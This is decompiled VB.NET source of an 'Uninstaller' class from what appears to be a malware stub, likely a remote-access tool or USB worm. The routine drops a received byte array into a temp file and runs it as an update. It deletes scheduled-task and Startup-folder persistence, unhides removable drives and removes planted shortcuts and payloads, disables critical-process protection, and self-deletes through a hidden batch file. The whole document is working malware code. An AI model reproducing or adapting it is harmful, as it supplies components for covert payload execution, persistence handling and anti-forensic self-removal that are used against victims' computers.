Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace Stub
	' Token: 0x0200000B RID: 11
	Public Class Uninstaller
		' Token: 0x06000044 RID: 68 RVA: 0x00004948 File Offset: 0x00002B48
		Public Shared Sub UNS(IsUpdate As Boolean, Str As String, B As Byte())
			If IsUpdate Then
				Try
					Str = Path.Combine(Path.GetTempPath(), Helper.GetRandomString(6) + Str)
					File.WriteAllBytes(Str, B)
				Catch ex As Exception
				End Try
			End If
			Try
				File.Delete(Settings.InstallDir + "\" + Path.GetFileName(Helper.current))
			Catch ex2 As Exception
			End Try
			Try
				Process.Start(New ProcessStartInfo() With { .FileName = "schtasks", .Arguments = "/delete /f  /tn """ + Path.GetFileNameWithoutExtension(Helper.current) + """", .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True })
			Catch ex3 As Exception
			End Try
			Try
				Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\" + Path.GetFileNameWithoutExtension(Helper.current) + ".lnk"
				If File.Exists(path) Then
					Helper.fileStream.Close()
					File.Delete(path)
				End If
			Catch ex4 As Exception
			End Try
			USB.USBStop()
			Try
				For Each driveInfo As DriveInfo In DriveInfo.GetDrives()
					If driveInfo.IsReady AndAlso driveInfo.DriveType = DriveType.Removable Then
						Dim text As String = driveInfo.Name
						Try
							Interaction.Shell("attrib -h -s " + text + "*.* /s /d", AppWinStyle.Hide, False, -1)
							File.Delete(text + Settings.USBNM)
						Catch ex5 As Exception
						End Try
						Dim files As String() = Directory.GetFiles(text, "*.lnk")
						For Each value As String In files
							Try
								File.Delete(Conversions.ToString(value))
							Catch ex6 As Exception
							End Try
						Next
						text = Nothing
					End If
				Next
			Catch ex7 As Exception
			End Try
			ProcessCritical.CriticalProcesses_Disable()
			Try
				Dim text2 As String = Path.GetTempFileName() + ".bat"
				Using streamWriter As StreamWriter = New StreamWriter(text2)
					streamWriter.WriteLine("@echo off")
					streamWriter.WriteLine("timeout 3 > NUL")
					streamWriter.WriteLine("CD " + Application.StartupPath)
					streamWriter.WriteLine("DEL """ + Path.GetFileName(Application.ExecutablePath) + """ /f /q")
					streamWriter.WriteLine("CD " + Path.GetTempPath())
					streamWriter.WriteLine("DEL """ + Path.GetFileName(text2) + """ /f /q")
				End Using
				If IsUpdate Then
					Try
						Process.Start(Str)
					Catch ex8 As Exception
					End Try
				End If
				Process.Start(New ProcessStartInfo() With { .FileName = text2, .CreateNoWindow = True, .ErrorDialog = False, .UseShellExecute = False, .WindowStyle = ProcessWindowStyle.Hidden })
				Environment.[Exit](0)
			Catch ex9 As Exception
			End Try
		End Sub
	End Class
End Namespace
